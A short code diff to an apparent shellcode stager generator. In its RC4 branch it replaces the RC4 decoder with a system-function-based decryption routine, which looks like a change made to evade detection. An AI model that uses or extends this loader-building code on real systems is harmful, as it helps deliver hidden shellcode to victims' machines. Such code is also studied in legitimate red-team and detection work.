@@ -154,8 +154,11 @@ class Stager:
     if self.encrypt == 'xor':
       main_code += ak.SC_XOR_DECODER.format(enc_key=self.shellcode.get_key_csharp())
     elif self.encrypt == 'rc4':
-      imports += ak.RC4_DECRYPT_IMPORT
-      main_code += ak.SC_RC4_DECODER.format(enc_key=self.shellcode.get_key_ascii())
+      # imports += ak.RC4_DECRYPT_IMPORT
+      # main_code += ak.SC_RC4_DECODER.format(enc_key=self.shellcode.get_key_ascii())
+      pinvoke_import_list += ak.SC_SYS32_DECODER_PINVOKE_IMPORT
+      imports += ak.SC_SYS32_DECODER_CODE_IMPORT
+      main_code += ak.SC_SYS32_DECODER.format(enc_key=self.shellcode.get_key_ascii())
     elif self.encrypt == 'aes':
       imports += ak.AES_DECRYPT_IMPORT
       main_code += ak.SC_AES_DECODER.format(enc_key=self.shellcode.key.decode('utf-8'),
